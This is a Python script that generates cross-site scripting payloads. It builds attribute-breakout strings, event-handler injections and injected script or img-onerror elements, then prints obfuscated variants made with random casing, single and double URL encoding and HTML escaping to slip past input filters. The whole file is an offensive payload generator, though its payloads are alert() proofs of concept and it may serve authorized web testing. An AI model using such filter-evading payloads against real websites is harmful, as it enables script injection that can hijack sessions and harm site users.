import random
import urllib.parse
import html

image_filepath = "/image/favicon.ico" #change this

base_payload_list = ["alert()","alert;throw 1","alert`1`"]
quotation_list = ["","\"","'","`"]
bracket_o_list = ["<a href="]

context_list = [
  "{base_payload}", # already in japascript
  "javascript:{base_payload}", # javascriptscheme
  "1{quote} {event_handler}={quote}{base_payload}", # execute in an element with event handler
  "1{quote}>{new_element}{bracket_o}{quote}1", # create a new element.
]

event_handler_list = [
  "onload",
  "onerror",
  "autofocus onfocus"
]

new_element_list = [
  "<script>{base_payload}<script>",
  "<{tag} {event_handler2}={base_payload}>"
]

tag_list = [
  "img src=doesNotExist.NaN",
  "img src="+image_filepath,
  "a href=\"http://doesNotExist.NaN\""
]

plain_payload_list = []

class payload_parameters:
  context = ""
  base_payload=""
  event_handler = ""
  quate=""
  new_element=""
  tag=""
  event_handler2 = ""
  bracket_o=""

def build_plain_payloads():
  pay_par = payload_parameters()
  for context in context_list:
    pay_par.context = context
    for base_payload in base_payload_list:
      pay_par.base_payload = base_payload
      for event_handler in event_handler_list:
        pay_par.event_handler = event_handler
        for quote in quotation_list:
          pay_par.quote = quote
          for new_element in new_element_list:
            pay_par.new_element = new_element
            for tag in tag_list:
              pay_par.tag = tag
              for event_handler2 in event_handler_list:
                pay_par.event_handler2 = event_handler2
                for bracket_o in bracket_o_list:
                  pay_par.bracket_o = bracket_o
                  build_plain_payload_for_param(pay_par)

def build_plain_payload_for_param(pay_par):
  global plain_payload_list
  plain_payload_list.append(
    pay_par.context.format(
      base_payload=pay_par.base_payload,
      quote=pay_par.quote,
      event_handler=pay_par.event_handler,
      new_element=pay_par.new_element.format(
        base_payload=pay_par.base_payload,
        tag=pay_par.tag,
        event_handler2=pay_par.event_handler2
      ),
      bracket_o=pay_par.bracket_o
    )
  )
  plain_payload_list = sorted(set(plain_payload_list),key=plain_payload_list.index)

def obfuscate_payloads():
  global obfuscated_payload_list
  for plain_payload in plain_payload_list:
    obfuscated_payload_list.append(randomize_upper_lower(plain_payload))
    obfuscated_payload_list.append(URLencode(plain_payload))
    obfuscated_payload_list.append(URLencode(URLencode(plain_payload)))
    obfuscated_payload_list.append(HTMLescape(plain_payload))

def randomize_upper_lower(payload):
  obfuscated_payload = ""
  for letter in payload:
    if type(letter) is str:
      if bool(random.getrandbits(1)):
        new_letter = letter.upper()
      else:
        new_letter = letter
      obfuscated_payload += new_letter
  return obfuscated_payload
  
def URLencode(payload):
  return urllib.parse.quote(payload)
def HTMLescape(payload):
  return html.escape(payload)

build_plain_payloads()
obfuscated_payload_list = plain_payload_list.copy()
obfuscate_payloads()
for payload in obfuscated_payload_list:
  print(payload)
